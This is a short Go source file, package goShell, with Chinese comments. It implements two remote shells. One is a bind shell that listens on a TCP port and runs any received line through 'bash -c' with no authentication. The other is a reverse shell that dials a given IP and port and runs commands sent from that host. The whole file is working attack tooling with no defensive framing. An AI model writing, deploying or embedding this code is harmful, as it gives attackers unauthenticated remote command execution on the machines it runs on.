package goShell

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

// OpenShell 本地开放端口 直连shell
func OpenShell(prot string) {
	openPort, err := net.Listen("tcp", prot)
	if err != nil {
		panic(err)
	}
	defer openPort.Close()

	fmt.Println("open port:", prot)

	for {
		// 处理每一个连接
		conn, err := openPort.Accept()
		if err != nil {
			fmt.Println("Connection error:", err)
			continue // 发生错误时继续监听
		}

		go handleConnection(conn) // go 处理连接
	}
}

// handleConnection 不直接调用
func handleConnection(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)

	for {
		message, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Read error:", err)
			return
		}

		message = strings.TrimSpace(message)
		output, err := exec.Command("bash", "-c", message).Output()
		if err != nil {
			fmt.Println("Command execution error:", err)
			return
		}

		_, err = conn.Write(output)
		if err != nil {
			fmt.Println("Write error:", err)
			return
		}
	}
}

// reShell 反弹shell
func reShell(ip string, port string) {
	reIp := ip + ":" + port
	conn, err := net.Dial("tcp", reIp)
	if err != nil {
		fmt.Println("Connection error:", err)
	}
	defer conn.Close()
	reader := bufio.NewReader(conn)
	for {
		message, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Read error:", err)
			return
		}
		message = strings.TrimSpace(message)
		output, err := exec.Command("bash", "-c", message).Output()
		if err != nil {
			fmt.Println("Command execution error:", err)
			return
		}
		_, err = conn.Write(output)
		if err != nil {
			fmt.Println("Write error:", err)
			return
		}

	}
}
